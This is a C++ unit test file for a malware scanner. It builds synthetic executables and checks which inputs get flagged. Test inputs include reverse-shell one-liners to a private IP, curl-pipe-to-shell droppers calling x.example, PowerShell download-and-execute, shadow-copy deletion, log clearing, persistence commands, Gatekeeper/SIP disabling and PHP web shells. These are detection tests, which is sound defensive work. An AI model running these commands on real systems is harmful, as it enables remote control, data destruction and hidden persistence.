// Unit tests for the file scanner: what it says about bytes and names, without
// any file on disk.
#include "check.h"

#include "malware.h"
#include "malware_scan.h"
#include "protocol.h"
#include "rules.h"
#include "scan.h"

#include <algorithm>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <string>
#include <vector>

using namespace lcscan;

namespace {

// "type type" for every hit, in order.
std::string kinds(const std::string &path, const std::string &bytes) {
    std::string out;
    for (const Hit &h : scan_file(path, bytes))
        out += (out.empty() ? "" : " ") + h.type;
    return out;
}

bool says(const std::string &path, const std::string &bytes, const char *type,
          const char *piece) {
    for (const Hit &h : scan_file(path, bytes))
        if (h.type == type && h.message.find(piece) != std::string::npos)
            return true;
    return false;
}

void put16(std::string &s, size_t at, uint16_t v) {
    s[at] = char(v & 0xff);
    s[at + 1] = char(v >> 8);
}
void put32(std::string &s, size_t at, uint32_t v) {
    put16(s, at, uint16_t(v & 0xffff));
    put16(s, at + 2, uint16_t(v >> 16));
}
bool mal_has_type(const std::string &path, const std::string &bytes, const char *type) {
    for (const Hit &h : scan_file(path, bytes, nullptr, true))
        if (h.type == type)
            return true;
    return false;
}

void put64(std::string &s, size_t at, uint64_t v) {
    put32(s, at, uint32_t(v & 0xffffffffu));
    put32(s, at + 4, uint32_t(v >> 32));
}

// A 32-bit PE with one .text section and a real import table naming `funcs`, so
// the scanner reads a table instead of meeting the names as strings. `tls` adds
// a TLS directory holding one callback.
std::string pe_with_imports(const std::vector<std::string> &funcs, bool tls = false) {
    std::string b(0x800, '\0');
    b[0] = 'M';
    b[1] = 'Z';
    put32(b, 0x3c, 0x80);
    b.replace(0x80, 4, std::string("PE\0\0", 4));
    put16(b, 0x80 + 4, 0x14c); // i386
    put16(b, 0x80 + 6, 1);     // one section
    put16(b, 0x80 + 20, 0xe0); // optional header size
    const size_t opt = 0x80 + 24;
    put16(b, opt, 0x10b);        // PE32
    put32(b, opt + 16, 0x1000);  // AddressOfEntryPoint
    put32(b, opt + 32, 0x1000);  // SectionAlignment
    put32(b, opt + 36, 0x200);   // FileAlignment
    put32(b, opt + 56, 0x2000);  // SizeOfImage
    put32(b, opt + 60, 0x200);   // SizeOfHeaders
    put16(b, opt + 68, 2);       // GUI
    put32(b, opt + 92, 16);      // NumberOfRvaAndSizes
    put32(b, opt + 96 + 8, 0x1100); // import directory RVA
    put32(b, opt + 96 + 12, 40);    // import directory size
    if (tls) {
        put32(b, opt + 96 + 9 * 8, 0x1500); // TLS directory RVA
        put32(b, opt + 96 + 9 * 8 + 4, 24);
    }
    const size_t sec = opt + 0xe0;
    b.replace(sec, 8, std::string(".text\0\0\0", 8));
    put32(b, sec + 8, 0x600);       // VirtualSize
    put32(b, sec + 12, 0x1000);     // VirtualAddress
    put32(b, sec + 16, 0x600);      // SizeOfRawData
    put32(b, sec + 20, 0x200);      // PointerToRawData
    put32(b, sec + 36, 0x60000020); // code | read | execute
    // .text maps RVA 0x1000 to file offset 0x200
    put32(b, 0x300, 0x1140);      // OriginalFirstThunk
    put32(b, 0x300 + 12, 0x1180); // DLL name
    put32(b, 0x300 + 16, 0x1140); // FirstThunk
    b.replace(0x380, 12, std::string("kernel32.dll", 12));
    size_t name_at = 0x400;
    for (size_t i = 0; i < funcs.size() && i < 8; ++i) {
        put32(b, 0x340 + i * 4, uint32_t(0x1000 + (name_at - 0x200)));
        b[name_at] = 0; // the two-byte hint
        b[name_at + 1] = 0;
        b.replace(name_at + 2, funcs[i].size(), funcs[i]);
        name_at += 2 + funcs[i].size();
        b[name_at] = 0;
        name_at = (name_at + 4) & ~size_t(3);
    }
    if (tls) {
        put32(b, 0x700 + 12, 0x1580); // AddressOfCallBacks
        put32(b, 0x780, 0x1590);      // one callback
    }
    return b;
}

// One .text section whose bytes are close to random: what a packer leaves when
// it compresses or encrypts the code.
std::string pe_with_random_code(bool tls = false) {
    std::string b(0xa00, '\0');
    b[0] = 'M';
    b[1] = 'Z';
    put32(b, 0x3c, 0x80);
    b.replace(0x80, 4, std::string("PE\0\0", 4));
    put16(b, 0x80 + 4, 0x14c);
    put16(b, 0x80 + 6, 1);
    put16(b, 0x80 + 20, 0xe0);
    const size_t opt = 0x80 + 24;
    put16(b, opt, 0x10b);
    put32(b, opt + 16, 0x1000);
    put32(b, opt + 32, 0x1000);
    put32(b, opt + 36, 0x200);
    put32(b, opt + 56, 0x2000);
    put32(b, opt + 60, 0x200);
    put16(b, opt + 68, 2);
    put32(b, opt + 92, 16);
    if (tls) {
        put32(b, opt + 96 + 9 * 8, 0x1500);
        put32(b, opt + 96 + 9 * 8 + 4, 24);
    }
    const size_t sec = opt + 0xe0;
    b.replace(sec, 8, std::string(".text\0\0\0", 8));
    put32(b, sec + 8, 0x800);
    put32(b, sec + 12, 0x1000);
    put32(b, sec + 16, 0x800);
    put32(b, sec + 20, 0x200);
    put32(b, sec + 36, 0x60000020);
    uint32_t x = 0x9e3779b9u;
    for (size_t i = 0x200; i < b.size(); ++i) {
        x ^= x << 13;
        x ^= x >> 17;
        x ^= x << 5;
        b[i] = char(x & 0xff);
    }
    if (tls) {
        put32(b, 0x700 + 12, 0x1580);
        put32(b, 0x780, 0x1590);
    }
    return b;
}

// A 64-bit little-endian ELF header with `phnum` program headers after it.
std::string elf(uint16_t type, uint16_t phnum) {
    std::string b(64 + 56 * size_t(phnum), '\0');
    b.replace(0, 4, "\x7f"
                    "ELF");
    b[4] = 2; // 64-bit
    b[5] = 1; // little-endian
    b[6] = 1;
    put16(b, 16, type);
    put16(b, 18, 62);
    put32(b, 20, 1);
    put64(b, 24, 0x400010); // entry
    put64(b, 32, 64);       // program headers follow the header
    put16(b, 52, 64);
    put16(b, 54, 56);
    put16(b, 56, phnum);
    put16(b, 58, 64);
    return b;
}

void program_header(std::string &b, size_t index, uint32_t type, uint32_t flags,
                    uint64_t vaddr, uint64_t memsz) {
    const size_t p = 64 + 56 * index;
    put32(b, p, type);
    put32(b, p + 4, flags);
    put64(b, p + 16, vaddr);
    put64(b, p + 40, memsz);
}

// A little-endian 64-bit Mach-O: the header, then the load commands, then the
// code-signing blob when there is one.
std::string macho64(const std::vector<std::string> &cmds, const std::string &sig = std::string()) {
    size_t cmd_bytes = 0;
    for (const std::string &c : cmds)
        cmd_bytes += c.size();
    const size_t sig_cmd = sig.empty() ? 0 : 16;
    const size_t blob_at = 32 + cmd_bytes + sig_cmd;
    std::string b(32, '\0');
    put32(b, 0, 0xfeedfacf); // MH_MAGIC_64
    put32(b, 4, 0x0100000c); // CPU_TYPE_ARM64
    put32(b, 12, 2);         // MH_EXECUTE
    put32(b, 16, uint32_t(cmds.size() + (sig.empty() ? 0 : 1)));
    put32(b, 20, uint32_t(cmd_bytes + sig_cmd));
    for (const std::string &c : cmds)
        b += c;
    if (!sig.empty()) {
        std::string lc(16, '\0');
        put32(lc, 0, 0x1d); // LC_CODE_SIGNATURE
        put32(lc, 4, 16);
        put32(lc, 8, uint32_t(blob_at));
        put32(lc, 12, uint32_t(sig.size()));
        b += lc;
        b += sig;
    }
    return b;
}

std::string lc_dylib(const std::string &name) {
    std::string c(24 + name.size() + 1, '\0');
    put32(c, 0, 0xc); // LC_LOAD_DYLIB
    put32(c, 4, uint32_t(c.size()));
    put32(c, 8, 24); // where the name starts in the command
    std::memcpy(&c[24], name.c_str(), name.size());
    return c;
}

std::string lc_segment(const char *name, uint32_t initprot) {
    std::string c(72, '\0');
    put32(c, 0, 0x19); // LC_SEGMENT_64
    put32(c, 4, uint32_t(c.size()));
    std::memcpy(&c[8], name, std::strlen(name));
    put32(c, 60, initprot);
    return c;
}

void putbe32(std::string &s, size_t at, uint32_t v) {
    s[at] = char(v >> 24);
    s[at + 1] = char(v >> 16);
    s[at + 2] = char(v >> 8);
    s[at + 3] = char(v);
}

// A code-signing SuperBlob holding a CodeDirectory (ad-hoc or not) and, when `xml`
// is not empty, the entitlements blob that carries it.
std::string codesig(bool adhoc, const std::string &xml) {
    std::string cd(16, '\0');
    putbe32(cd, 0, 0xfade0c02);
    putbe32(cd, 4, uint32_t(cd.size()));
    putbe32(cd, 8, 0x20400); // version
    putbe32(cd, 12, adhoc ? 2u : 0u);
    std::string ent;
    if (!xml.empty()) {
        ent.assign(8, '\0');
        putbe32(ent, 0, 0xfade7171);
        putbe32(ent, 4, uint32_t(8 + xml.size()));
        ent += xml;
    }
    const uint32_t n = xml.empty() ? 1u : 2u;
    std::string sb(12 + 8 * size_t(n), '\0');
    putbe32(sb, 0, 0xfade0cc0);
    putbe32(sb, 8, n);
    putbe32(sb, 12, 0);              // the CodeDirectory, first
    putbe32(sb, 16, uint32_t(sb.size()));
    if (!xml.empty()) {
        putbe32(sb, 20, 5);          // the entitlements
        putbe32(sb, 24, uint32_t(sb.size() + cd.size()));
    }
    sb += cd;
    sb += ent;
    putbe32(sb, 4, uint32_t(sb.size()));
    return sb;
}

const char kEicarHead[] = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$";
const char kEicarTail[] = "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

} // namespace

TEST(scan_the_eicar_test_file) {
    const std::string eicar = std::string(kEicarHead) + kEicarTail;
    CHECK_EQ(kinds("/tmp/eicar.com", eicar), std::string("malware-signature"));
    CHECK_EQ(kinds("/tmp/notes.txt", "a line\n" + eicar + "\nanother\n"),
             std::string("malware-signature"));
    CHECK(says("/tmp/eicar.com", eicar, "malware-signature", "meant to be found"));
    CHECK_EQ(kinds("/tmp/notes.txt", "nothing here\n"), std::string(""));
    // The tail is quoted on its own in this tree; only the full string counts.
    CHECK_EQ(kinds("/tmp/eicar.com", kEicarTail), std::string(""));
    CHECK_EQ(kinds("/tmp/eicar.com", kEicarHead), std::string(""));
    CHECK_EQ(kinds("/tmp/eicar.com", std::string(kEicarHead) + " " + kEicarTail),
             std::string(""));
}

TEST(scan_names_that_pretend) {
    // two extensions, padded or not; a text direction control
    CHECK_EQ(kinds("/h/invoice.pdf.exe", "x"), std::string("masquerade"));
    CHECK(says("/h/invoice.pdf.exe", "x", "masquerade", "looks like a .pdf document"));
    CHECK_EQ(kinds("/h/photo.jpg      .scr", "x"), std::string("masquerade"));
    CHECK_EQ(kinds("/h/Report.DOC.JS", "x"), std::string("masquerade"));
    CHECK_EQ(kinds(std::string("/h/photo\xE2\x80\xAE") + "gnp.exe", "x"), std::string("masquerade"));
    // ordinary names
    CHECK_EQ(kinds("/h/readme.txt", "x"), std::string(""));
    CHECK_EQ(kinds("/h/archive.tar.gz", "x"), std::string(""));
    CHECK_EQ(kinds("/h/setup.exe", "x"), std::string(""));
    CHECK_EQ(kinds("/h/notes.exe.txt", "x"), std::string(""));
}

TEST(scan_programs_named_like_documents) {
    const std::string prog = elf(2, 0);
    CHECK_EQ(kinds("/h/report.pdf", prog), std::string("disguised-executable"));
    CHECK(says("/h/report.pdf", prog, "disguised-executable", "a Linux program named like a .pdf"));
    CHECK_EQ(kinds("/h/photo.JPG", "#!/bin/sh\nexit 0\n"), std::string("disguised-executable"));
    CHECK_EQ(kinds("/h/report", prog), std::string(""));
    CHECK_EQ(kinds("/h/report.pdf", "%PDF-1.4\n1 0 obj\n"), std::string(""));
}

TEST(scan_names_of_system_programs) {
    const std::string prog = elf(2, 0);
    // a service's name in a place any user can write; the real place; a quiet place
    CHECK_EQ(kinds("/tmp/.x/sshd", prog), std::string("masquerade"));
    CHECK_EQ(kinds("/dev/shm/kworker", prog), std::string("masquerade"));
    CHECK_EQ(kinds("/usr/sbin/sshd", prog), std::string(""));
    CHECK_EQ(kinds("/home/u/src/sshd", prog), std::string(""));
    // gpasswd and cron are real programs that live next to the names they resemble
    CHECK_EQ(kinds("/usr/bin/gpasswd", prog), std::string(""));
    CHECK_EQ(kinds("/usr/sbin/cron", prog), std::string(""));
    CHECK_EQ(kinds("/tmp/gpasswd", prog), std::string("masquerade"));
    // a name one letter away
    CHECK_EQ(kinds("/home/u/bin/systemdd", prog), std::string("masquerade"));
    CHECK_EQ(kinds("/home/u/bin/syst3md", prog), std::string("masquerade"));
    CHECK_EQ(kinds("/home/u/bin/rsyslogg", prog), std::string("masquerade"));
    CHECK_EQ(kinds("/home/u/bin/mytool", prog), std::string(""));
    // text files are not programs
    CHECK_EQ(kinds("/tmp/.x/sshd", "notes\n"), std::string(""));
}

TEST(scan_windows_system_process_names) {
    std::string pe(0x200, '\0');
    pe[0] = 'M';
    pe[1] = 'Z';
    put32(pe, 0x3c, 0x80);
    pe.replace(0x80, 4, std::string("PE\0\0", 4));
    CHECK(kind_of(pe) == Kind::Pe);
    CHECK_EQ(kinds("/home/u/Downloads/svchost.exe", pe), std::string("masquerade"));
    CHECK_EQ(kinds("/mnt/c/Windows/System32/svchost.exe", pe), std::string(""));
    CHECK_EQ(kinds("/home/u/Downloads/svch0st.exe", pe), std::string("masquerade"));
    CHECK_EQ(kinds("/home/u/Downloads/scvhost.exe", pe), std::string("masquerade"));
    CHECK_EQ(kinds("/home/u/Downloads/lsasss.exe", pe), std::string("masquerade"));
    CHECK_EQ(kinds("/home/u/Downloads/putty.exe", pe), std::string(""));
}

TEST(scan_macos_system_process_names) {
    std::string macho(0x40, '\0');
    put32(macho, 0, 0xfeedfacf); // MH_MAGIC_64, little-endian
    CHECK(kind_of(macho) == Kind::MachO);
    CHECK_EQ(kinds("/Users/u/Downloads/launchd", macho), std::string("masquerade"));
    CHECK_EQ(kinds("/sbin/launchd", macho), std::string(""));
    CHECK_EQ(kinds("/Users/u/Downloads/WindowServer", macho), std::string("masquerade"));
    CHECK_EQ(kinds("/System/Library/PrivateFrameworks/SkyLight.framework/Resources/WindowServer",
                   macho),
             std::string(""));
    // the check is case-blind: "windowserver" still passes for "WindowServer"
    CHECK_EQ(kinds("/Users/u/Downloads/windowserver", macho), std::string("masquerade"));
    // a name one letter away
    CHECK_EQ(kinds("/Users/u/Downloads/launchdd", macho), std::string("masquerade"));
    CHECK_EQ(kinds("/Users/u/Downloads/coreaudiiod", macho), std::string("masquerade"));
    CHECK_EQ(kinds("/Users/u/Downloads/mytool", macho), std::string(""));
    // an ELF with the same name is judged by the Linux list, not the macOS one
    CHECK_EQ(kinds("/home/u/bin/WindowServer", elf(2, 0)), std::string(""));
}

TEST(scan_macos_command_lines_need_malware_flag) {
    auto says_with = [](const char *path, const std::string &bytes, bool malware, const char *type) {
        for (const Hit &h : lcscan::scan_file(path, bytes, nullptr, malware))
            if (h.type == type)
                return true;
        return false;
    };
    const char *quarantine = "#!/bin/sh\nxattr -d com.apple.quarantine /tmp/Evil.app\n";
    const char *gatekeeper = "#!/bin/sh\nsudo spctl --master-disable\n";
    const char *sip = "#!/bin/sh\ncsrutil disable\n";
    const char *launch = "#!/bin/sh\nlaunchctl load -w ~/Library/LaunchAgents/com.evil.plist\n";
    const char *prompt = "osascript -e 'do shell script \"rm -rf /\" with administrator privileges'\n";
    const char *clean = "#!/bin/sh\necho hello\n";
    // off by default: these rows only run under --malware
    CHECK(!says_with("/h/a.sh", quarantine, false, "anti-analysis"));
    CHECK(says_with("/h/a.sh", quarantine, true, "anti-analysis"));
    CHECK(!says_with("/h/b.sh", gatekeeper, false, "system-tampering"));
    CHECK(says_with("/h/b.sh", gatekeeper, true, "system-tampering"));
    CHECK(says_with("/h/c.sh", sip, true, "system-tampering"));
    CHECK(says_with("/h/d.sh", launch, true, "persistence"));
    CHECK(says_with("/h/e.scpt", prompt, true, "privilege-escalation"));
    CHECK(!says_with("/h/f.sh", clean, true, "anti-analysis"));
    CHECK(!says_with("/h/f.sh", clean, true, "system-tampering"));
    CHECK(!says_with("/h/f.sh", clean, true, "persistence"));
}

TEST(scan_commands_of_a_trojan_in_scripts) {
    CHECK_EQ(kinds("/h/a.sh", "#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"),
             std::string("reverse-shell"));
    CHECK_EQ(kinds("/h/b.sh", "#!/bin/sh\ncurl -s https://x.example/i.sh | sh\n"),
             std::string("dropper"));
    CHECK_EQ(kinds("/h/c.sh", "#!/bin/sh\necho '*/5 * * * * /tmp/x' | crontab -\n"),
             std::string("persistence"));
    CHECK_EQ(kinds("/h/d.sh", "#!/bin/sh\necho hello\nls -l /tmp | sort\n"), std::string(""));
    // a script without a shebang is still one by its extension; documentation is not
    CHECK_EQ(kinds("/h/e.sh", "nc -e /bin/sh 10.0.0.1 4444\n"), std::string("reverse-shell"));
    CHECK_EQ(kinds("/h/os.sh", "#!/bin/sh\nopenssl s_client -quiet -connect 10.0.0.1:443 | sh\n"),
             std::string("reverse-shell"));
    CHECK_EQ(kinds("/h/ob.sh",
                   "#!/bin/sh\nopenssl s_client -quiet -connect 10.0.0.1:443 | /bin/sh\n"),
             std::string("reverse-shell"));
    CHECK_EQ(kinds("/h/oq.sh", "#!/bin/sh\nopenssl s_client -quiet -connect 10.0.0.1:443\n"),
             std::string(""));
    CHECK_EQ(kinds("/h/sl.sh", "#!/bin/sh\nsocat TCP-LISTEN:4444 STDOUT\n"), std::string(""));
    CHECK_EQ(kinds("/h/README.txt", "to get a shell: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"),
             std::string(""));
    CHECK_EQ(kinds("/h/README.md", "curl https://x.example/i.sh | sh\n"), std::string(""));
}

TEST(scan_interpreter_one_liner_starts_a_shell) {
    CHECK_EQ(kinds("/h/a.sh",
                   "#!/bin/sh\npython3 -c 'import subprocess; subprocess.call([\"/bin/sh\",\"-i\"])'\n"),
             std::string("reverse-shell"));
    CHECK_EQ(kinds("/h/b.sh",
                   "#!/bin/sh\nruby -e 'require \"socket\"; c=TCPSocket.open(\"10.0.0.1\",4444); exec \"/bin/sh\"'\n"),
             std::string("reverse-shell"));
    CHECK_EQ(kinds("/h/c.sh",
                   "#!/bin/sh\nperl -e 'use IO::Socket; IO::Socket::INET->new(PeerAddr=>\"10.0.0.1\"); exec \"/bin/sh\"'\n"),
             std::string("reverse-shell"));
    CHECK_EQ(kinds("/h/d.sh",
                   "#!/bin/sh\npython3 -c 'import subprocess; subprocess.call([\"/bin/true\"])'\n"),
             std::string(""));
}

TEST(scan_absolute_path_decode_into_a_shell) {
    CHECK_EQ(kinds("/h/a.sh", "#!/bin/sh\necho ZWNobyBoaQ== | /usr/bin/base64 -d | /bin/sh\n"),
             std::string("dropper"));
    CHECK_EQ(kinds("/h/b.sh", "#!/bin/sh\n/usr/bin/curl -fsSL http://x.example/a.sh | /bin/sh\n"),
             std::string("dropper"));
    CHECK_EQ(kinds("/h/c.sh", "#!/bin/sh\necho ZWNobyBoaQ== | /usr/bin/base64 -d\n"),
             std::string(""));
}

TEST(scan_command_substitution_into_a_shell) {
    CHECK_EQ(kinds("/h/a.sh", "#!/bin/sh\nbash -c \"$(curl -fsSL http://x.example/a.sh)\"\n"),
             std::string("dropper"));
    CHECK_EQ(kinds("/h/b.sh", "#!/bin/sh\nbash -c \"curl --version\"\n"), std::string(""));
}

TEST(scan_host_names_that_imitate_trusted_ones) {
    CHECK_EQ(kinds("/h/a.sh", "#!/bin/sh\ngit clone https://github.com.update-now.example/x\n"),
             std::string("masquerade"));
    CHECK_EQ(kinds("/h/b.sh", "#!/bin/sh\nwget http://micros0ft.com/a.bin\n"), std::string("masquerade"));
    CHECK_EQ(kinds("/h/c.sh", "#!/bin/sh\ncurl https://paypa1.com/login\n"), std::string("masquerade"));
    CHECK_EQ(kinds("/h/d.sh",
                   "#!/bin/sh\ngit clone https://github.com/a/b\ncurl https://api.github.com/x\n"
                   "wget https://raw.githubusercontent.com/a/b/c https://www.google.com/\n"),
             std::string(""));
    // a longer real name, a project one edit from the front, and junk after the host
    CHECK_EQ(kinds("/h/e.sh", "#!/bin/sh\ncurl https://www.pyopenssl.org/a\n"), std::string(""));
    CHECK_EQ(kinds("/h/f.sh", "#!/bin/sh\ncurl https://ipython.org/\n"), std::string(""));
    CHECK_EQ(kinds("/h/g.sh", "#!/bin/sh\ncurl https://api.github.com{next\n"), std::string(""));
    CHECK_EQ(kinds("/h/h.sh", "#!/bin/sh\ncurl https://gooogle.com/a\n"), std::string("masquerade"));
    CHECK_EQ(kinds("/h/rn.sh", "#!/bin/sh\ncurl https://rnicrosoft.com/a\n"), std::string("masquerade"));
    CHECK_EQ(kinds("/h/i.sh", "#!/bin/sh\ncurl https://gooogle.com)\n"), std::string("masquerade"));
}

TEST(scan_system_programs_are_not_judged_by_their_own_strings) {
    // bash really does contain /dev/tcp. That is the program, not a trojan
    // that arrived in a download directory.
    std::string bash = elf(2, 0);
    bash += "/dev/tcp/10.0.0.1/4444 bash -i >&";
    CHECK_EQ(kinds("/usr/bin/bash", bash), std::string(""));
    CHECK_EQ(kinds("/tmp/notbash", bash), std::string("reverse-shell"));
    // a packer mark in a system directory is that program; the same bytes elsewhere are not
    CHECK_EQ(kinds("/usr/bin/packed", elf(2, 0) + "UPX!"), std::string(""));
    CHECK(says("/tmp/packed", elf(2, 0) + "UPX!", "suspicious-binary", "UPX"));
}

TEST(scan_miners_ransom_notes_and_web_shells) {
    CHECK_EQ(kinds("/h/m.sh", "#!/bin/sh\n./run -o stratum+tcp://pool.example:3333 -u w\n"),
             std::string("cryptominer"));
    CHECK_EQ(kinds("/h/note.html", "<h1>Your files have been encrypted</h1>"),
             std::string("malware-signature"));
    CHECK_EQ(kinds("/h/s.php", "<?php eval($_POST['x']); ?>"), std::string("malware-signature"));
    CHECK_EQ(kinds("/h/t.php", "<?php system($_GET['cmd']); ?>"), std::string("malware-signature"));
    CHECK_EQ(kinds("/h/ok.php", "<?php echo htmlspecialchars($_GET['q']); ?>"), std::string(""));
    CHECK_EQ(kinds("/h/r.txt", "all clear\n"), std::string(""));
}

TEST(scan_how_a_program_is_built) {
    // writable and executable, and an executable stack
    std::string b = elf(2, 2);
    program_header(b, 0, 1, 7, 0x400000, 0x1000);       // PT_LOAD rwx
    program_header(b, 1, 0x6474e551, 7, 0, 0);          // PT_GNU_STACK rwx
    CHECK_EQ(kinds("/h/prog", b), std::string("suspicious-binary"));
    CHECK(says("/h/prog", b, "suspicious-binary", "executable stack") ||
          says("/h/prog", b, "suspicious-binary", "writable and executable"));
    std::vector<size_t> more;
    scan_file("/h/prog", b, &more);
    CHECK(more.size() == 1 && more[0] >= 1); // one hit, with the others counted
    // a normal one: read/execute code, no executable stack, entry inside it
    std::string ok = elf(2, 2);
    program_header(ok, 0, 1, 5, 0x400000, 0x1000);      // PT_LOAD r-x
    program_header(ok, 1, 0x6474e551, 6, 0, 0);         // PT_GNU_STACK rw-
    put16(ok, 60, 3);                                   // with section headers (not read)
    CHECK_EQ(kinds("/h/prog", ok), std::string(""));
    // the entry point is outside any executable segment
    std::string away = elf(2, 1);
    program_header(away, 0, 1, 5, 0x500000, 0x1000);
    put16(away, 60, 3);
    CHECK(says("/h/prog", away, "suspicious-binary", "entry point is not inside an executable"));
    // packed with UPX
    CHECK(says("/h/prog", ok + "UPX!", "suspicious-binary", "UPX"));
    // random bytes behind a header
    std::string noisy = ok;
    uint32_t x = 12345;
    for (int i = 0; i < 20000; ++i) {
        x = x * 1664525u + 1013904223u;
        noisy.push_back(char(x >> 24));
    }
    CHECK(says("/h/prog", noisy, "suspicious-binary", "look random"));
}

TEST(scan_a_preload_library_that_defines_readdir) {
    // sections: null, .dynsym (one symbol: readdir, defined), .dynstr
    std::string b(64 + 16 + 48 + 3 * 64, '\0');
    b.replace(0, 4, "\x7f"
                    "ELF");
    b[4] = 2;
    b[5] = 1;
    put16(b, 16, 3); // ET_DYN
    put64(b, 40, 64 + 16 + 48); // section headers
    put16(b, 58, 64);
    put16(b, 60, 3);
    b.replace(64, 9, std::string("\0readdir\0", 9)); // .dynstr
    const size_t sym = 80;                           // .dynsym: [null][readdir]
    put32(b, sym + 24, 1);                           // name at 1
    put16(b, sym + 24 + 6, 1);                       // defined in section 1
    const size_t sh = 64 + 16 + 48;
    put32(b, sh + 64 + 4, 11);                       // SHT_DYNSYM
    put64(b, sh + 64 + 24, sym);
    put64(b, sh + 64 + 32, 48);
    put32(b, sh + 64 + 40, 2);                       // its strings: section 2
    put32(b, sh + 128 + 4, 3);                       // SHT_STRTAB
    put64(b, sh + 128 + 24, 64);
    put64(b, sh + 128 + 32, 9);
    CHECK(says("/h/libhide.so", b, "suspicious-binary", "defines readdir()"));
    CHECK_EQ(kinds("/usr/lib/libc.so.6", b), std::string(""));
}

TEST(scan_a_packed_windows_program) {
    std::string pe(0x400, '\0');
    pe[0] = 'M';
    pe[1] = 'Z';
    put32(pe, 0x3c, 0x80);
    pe.replace(0x80, 4, std::string("PE\0\0", 4));
    put16(pe, 0x80 + 6, 1);      // one section
    put16(pe, 0x80 + 20, 0xe0);  // optional header size
    put16(pe, 0x80 + 24, 0x10b); // PE32
    const size_t section = 0x80 + 24 + 0xe0;
    pe.replace(section, 4, "UPX0");
    CHECK(says("/h/setup.exe", pe, "suspicious-binary", "section named UPX0"));
    put32(pe, section + 36, 0xE0000020); // read, write, execute, code
    pe.replace(section, 8, std::string(".text\0\0\0", 8));
    CHECK(says("/h/setup.exe", pe, "suspicious-binary", "both writable and executable"));
    CHECK_EQ(kinds("/h/setup.exe", "MZ"), std::string(""));
}

TEST(scan_windows_imports_say_what_the_program_can_do) {
    CHECK(says("/h/setup.exe", pe_with_imports({"URLDownloadToFileW", "ShellExecuteW"}),
               "dropper", "URLDownloadToFile"));
    CHECK(says("/h/steal.exe", pe_with_imports({"CryptUnprotectData", "CredEnumerateW"}),
               "credential-access", "CredEnumerate"));
    // reading one named credential is what Remote Desktop and the sync clients do
    CHECK_EQ(kinds("/h/mstsc.exe", pe_with_imports({"CryptUnprotectData", "CredReadW"})),
             std::string(""));
    // a debugger imports the thread and memory calls too, so that pair proves nothing
    CHECK_EQ(kinds("/h/dbg.exe", pe_with_imports({"GetThreadContext", "SetThreadContext",
                                                  "WriteProcessMemory", "VirtualAllocEx",
                                                  "QueueUserAPC"})),
             std::string(""));
    // an ordinary program's imports say nothing about what it does wrong
    CHECK_EQ(kinds("/h/clean.exe", pe_with_imports({"CreateFileW", "ReadFile", "CloseHandle"})),
             std::string(""));
}

TEST(scan_windows_program_that_resolves_its_calls_at_run_time) {
    CHECK(says("/h/loader.exe", pe_with_imports({"LoadLibraryA", "GetProcAddress"}),
               "suspicious-binary", "chosen at run time"));
}

TEST(scan_windows_tls_callback_runs_before_the_entry_point) {
    // many compilers register one in every program, so on its own it says nothing
    CHECK_EQ(kinds("/h/normal.exe", pe_with_imports({"CreateFileW"}, true)), std::string(""));
    // beside packed code it is part of the picture
    CHECK(says("/h/packed.exe", pe_with_random_code(true), "suspicious-binary", "TLS callback"));
}

TEST(scan_windows_code_that_does_not_look_like_code) {
    CHECK(says("/h/packed.exe", pe_with_random_code(), "suspicious-binary", "looks random"));
}

TEST(scan_windows_apis_of_injection_and_key_logging) {
    std::string pe(0x200, '\0');
    pe[0] = 'M';
    pe[1] = 'Z';
    put32(pe, 0x3c, 0x80);
    pe.replace(0x80, 4, std::string("PE\0\0", 4));
    CHECK(says("/h/a.exe", pe + "WriteProcessMemory CreateRemoteThread VirtualAllocEx",
               "process-injection", "WriteProcessMemory"));
    CHECK(says("/h/a.exe", pe + "SetWindowsHookExW GetAsyncKeyState", "credential-access",
               "key logger"));
    CHECK_EQ(kinds("/h/a.exe", pe + "WriteProcessMemory"), std::string(""));
}


TEST(scan_scripts_that_decode_and_run) {
    CHECK_EQ(kinds("/h/a.py", "import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))\n"),
             std::string("obfuscated-code"));
    CHECK_EQ(kinds("/h/b.js", "eval(atob('YWxlcnQoMSk='));\n"),
             std::string("obfuscated-code"));
    CHECK_EQ(kinds("/h/c.php", "<?php eval(gzinflate(base64_decode('SzTUAwA='))); ?>"),
             std::string("malware-signature obfuscated-code"));
    CHECK_EQ(kinds("/h/d.ps1", "powershell -nop -w hidden -EncodedCommand JABzAD0A\n"),
             std::string("obfuscated-code"));
    CHECK_EQ(kinds("/h/e.sh", "#!/bin/sh\necho " + std::string(5000, 'A') + "\n"),
             std::string("obfuscated-code"));
    CHECK_EQ(kinds("/h/f.py", "import base64\nprint(base64.b64decode('aGk=').decode())\n"),
             std::string(""));
    CHECK_EQ(kinds("/h/g.py", "x = base64.b64decode(y)\n" + std::string(400, '#') + "\neval(z)\n"),
             std::string(""));
    CHECK_EQ(kinds("/h/h.sh", "#!/bin/sh\necho " + std::string(5000, ' ') + "\n"),
             std::string(""));
}

TEST(scan_windows_scripts_and_directories) {
    CHECK_EQ(kinds("C:/Users/bob/a.bat", "@echo off\nvssadmin delete shadows /all /quiet\n"),
             std::string("destructive-command"));
    CHECK_EQ(kinds("C:/Users/bob/a.bat", "VSSADMIN.EXE Delete Shadows /All\n"),
             std::string("destructive-command"));
    CHECK_EQ(kinds("C:/Users/bob/a.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')\n"),
             std::string("dropper"));
    CHECK_EQ(kinds("C:/Users/bob/a.bat", "certutil -urlcache -f http://x.example/a.exe a.exe\n"),
             std::string("dropper"));
    CHECK_EQ(kinds("C:/Users/bob/a.bat", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d y\n"),
             std::string("persistence"));
    CHECK_EQ(kinds("C:/Users/bob/a.bat", "schtasks /create /tn x /tr y /sc onlogon\n"),
             std::string("persistence"));
    CHECK_EQ(kinds("C:/Users/bob/a.bat", "wevtutil cl Security\n"),
             std::string("log-tampering"));
    CHECK_EQ(kinds("C:/Users/bob/a.ps1", "$c = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444); powershell\n"),
             std::string("reverse-shell"));
    CHECK_EQ(kinds("C:/Users/bob/a.bat", "@echo off\nschtasks /query\necho done\n"),
             std::string(""));
